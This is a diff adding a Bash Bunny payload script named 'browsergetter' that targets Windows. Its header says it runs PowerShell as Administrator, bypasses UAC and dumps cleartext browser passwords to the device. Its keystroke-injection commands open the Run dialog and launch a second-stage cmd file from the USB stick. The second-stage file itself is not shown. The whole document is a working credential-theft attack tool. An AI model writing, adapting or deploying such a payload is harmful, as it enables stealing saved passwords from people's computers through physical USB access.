@@ -1,0 +1,27 @@
+#!/bin/bash
+#
+# Title:         browsergetter
+# Author:        greenwe333
+# Version:       1.0
+# Target:        Windows
+# 
+# Runs powershell as Administrator
+# Bypasses UAC
+# Dumps cleartext browser passwords and infos to the Bash Bunny
+#
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R 100
+
+# Create directory to dump infos
+mkdir -p /root/udisk/loot/BrowserGetter
+
+
+LED R
+ATTACKMODE HID STORAGE
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\a.cmd')"
+QUACK ENTER
+LED G
